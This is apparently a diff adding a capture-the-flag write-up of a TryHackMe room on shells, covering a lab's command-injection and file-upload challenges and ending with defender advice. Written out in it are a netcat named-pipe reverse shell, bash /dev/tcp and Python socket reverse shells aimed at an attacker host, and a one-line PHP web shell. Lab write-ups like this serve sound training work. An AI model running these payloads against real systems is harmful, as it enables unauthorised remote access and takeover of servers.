@@ -1,0 +1,177 @@
+# Shells Overview — TryHackMe
+
+> Learn about the different types of shells and exploit real vulnerabilities to get flags.
+
+**Room:** https://tryhackme.com/room/shellsoverview  
+**Difficulty:** Easy  
+**Category:** Offensive Security Tooling  
+**Completed:** 11 June 2026
+
+---
+
+## Summary
+
+This room covers the fundamentals of shells used in penetration testing — reverse shells, bind shells, shell listeners, and shell payloads across multiple languages. The practical task required exploiting two real vulnerabilities: a command injection vulnerability using a reverse shell, and an unrestricted file upload vulnerability using a PHP web shell. Both flags were retrieved from the `/` directory of the target server.
+
+## Tools Used
+
+- `nc` (netcat) — shell listener
+- `bash` — reverse shell payload
+- `PHP` — web shell payload
+- `nmap` — port scanning
+- Browser — web application interaction
+
+---
+
+## Key Concepts
+
+### Reverse Shell vs Bind Shell
+
+| Type | How it works | When to use |
+|------|-------------|-------------|
+| **Reverse Shell** | Target connects back to attacker | When target is behind firewall |
+| **Bind Shell** | Attacker connects to target | When attacker is behind firewall |
+
+### Shell Payloads by Language
+
+| Language | Priority | Use case |
+|----------|----------|---------|
+| Bash | ⭐⭐⭐ Must know | Most Linux targets |
+| Python | ⭐⭐⭐ Must know | When bash fails |
+| PHP | ⭐⭐ Important | Web app attacks |
+| BusyBox | ⭐ Good to know | Embedded/IoT devices |
+
+### File Descriptors
+
+| Number | What it is |
+|--------|-----------|
+| `0` | stdin (input) |
+| `1` | stdout (output) |
+| `2` | stderr (errors) |
+| `3`+ | custom file descriptors |
+
+---
+
+## Task 8 — Practical Challenge
+
+**Target:** `10.146.166.105`  
+**Attacker:** `10.146.113.115`
+
+### Challenge 1 — Command Injection (Port 8081)
+
+**Vulnerability:** The web application at port 8081 passed user input directly to system commands without sanitisation — classic command injection.
+
+#### Step 1 — Start Listener
+```bash
+nc -lvnp 4444
+```
+
+#### Step 2 — Inject Reverse Shell
+
+In the vulnerable input field on the website, injected a named pipe reverse shell:
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.146.113.115 4444 >/tmp/f
+```
+
+**Why named pipe instead of standard bash reverse shell?**
+The named pipe payload is more reliable when the standard bash redirect (`>&`) fails due to shell interpretation issues on the target.
+
+#### Step 3 — Get Flag
+Once shell connected:
+```bash
+ls /
+cat /flag.txt
+```
+
+**Flag 1:** `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`
+
+---
+
+### Challenge 2 — Unrestricted File Upload (Port 8082)
+
+**Vulnerability:** The web application at port 8082 allowed uploading any file type — including `.php` files — without validation. This allowed uploading a malicious PHP web shell.
+
+#### Step 1 — Create Web Shell
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Or alternatively a direct file read shell:
+```php
+<?php
+echo "<pre>";
+echo file_get_contents('/flag.txt');
+echo "</pre>";
+?>
+```
+
+#### Step 2 — Upload Shell
+Navigated to `http://10.146.166.105:8082` and uploaded `shell.php` using the file upload form.
+
+#### Step 3 — Execute Commands
+Accessed the uploaded shell via browser:
+```
+http://10.146.166.105:8082/uploads/shell.php?cmd=cat /flag.txt
+```
+
+**Flag 2:** `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`
+
+---
+
+## Key Shell Payloads to Remember
+
+### Bash Reverse Shell (most common)
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+```
+
+### Named Pipe Reverse Shell (more reliable)
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f
+```
+
+### Python Reverse Shell
+```bash
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+```
+
+### PHP Web Shell (one liner)
+```php
+<?php system($_GET["cmd"]); ?>
+```
+
+### Always Upgrade Your Shell After Getting Access
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+---
+
+## Lessons Learned
+
+- The named pipe reverse shell is more reliable than the standard bash redirect when the target has shell interpretation issues
+- Never run `pkill nc` in AttackBox — it kills your own connection
+- PHP web shells only need one line to work — simplicity is key
+- Always use port 443 or 80 in real engagements — firewalls rarely block these
+- File upload vulnerabilities are critical — always check what file types a web app accepts
+- After getting a shell, first command should always be `ls /` to see what's on the system
+
+## Defender's Perspective
+
+- Validate and whitelist file upload types — never allow `.php`, `.asp`, `.jsp`
+- Sanitise all user input before passing to system commands
+- Use Web Application Firewalls (WAF) to detect command injection attempts
+- Run web applications with minimal privileges — not as root
+- Implement Content Security Policy (CSP) headers
+- Monitor for unusual outbound connections from web servers
+
+---
+
+## References
+
+- https://tryhackme.com/room/shellsoverview
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
